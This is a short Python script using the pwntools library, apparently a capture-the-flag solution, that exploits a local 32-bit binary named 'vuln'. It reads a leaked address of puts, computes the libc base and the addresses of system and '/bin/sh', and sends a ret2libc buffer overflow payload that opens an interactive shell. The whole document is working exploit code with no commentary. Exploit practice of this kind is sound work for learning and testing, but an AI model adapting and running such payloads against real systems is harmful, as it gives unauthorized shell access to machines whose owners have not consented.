from pwn import *

p = process("./vuln")
binary = ELF("vuln")
padding = 160
libc = ELF("libc6_2.23-0ubuntu10_i386.so", checksec = False)

p.recvuntil("puts: ")
puts = p.recvline()[:-1]
puts = int(puts, 16)
base_libc = puts - libc.symbols["puts"]
log.info("Base libc: 0x{0:x}".format(base_libc))
system_libc = base_libc + libc.symbols["system"]
log.info("System libc: 0x{0:x}".format(system_libc))
binsh_libc = base_libc + libc.search("/bin/sh").next()
log.info("/bin/sh libc: 0x{0:x}".format(binsh_libc))

payload = ""
payload += "A" * padding
payload += p32(system_libc)
payload += "JUNK"
payload += p32(binsh_libc)

p.sendline(payload)
p.interactive()
